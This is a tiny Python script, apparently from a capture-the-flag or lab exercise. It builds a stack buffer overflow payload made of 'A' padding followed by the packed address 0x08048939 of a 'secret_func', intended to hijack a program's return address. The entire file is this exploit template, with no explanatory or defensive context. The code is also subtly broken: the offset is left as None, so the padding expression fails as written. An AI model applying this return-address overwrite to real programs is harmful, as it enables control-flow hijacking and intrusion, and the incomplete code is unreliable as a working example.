#!/usr/bin/env python

import struct

def p32(num):
	return struct.pack("<I", num)

offset = None


secret_func_address = 0x08048939
payload = offset * "A" + p32(secret_func_address)

print(payload)
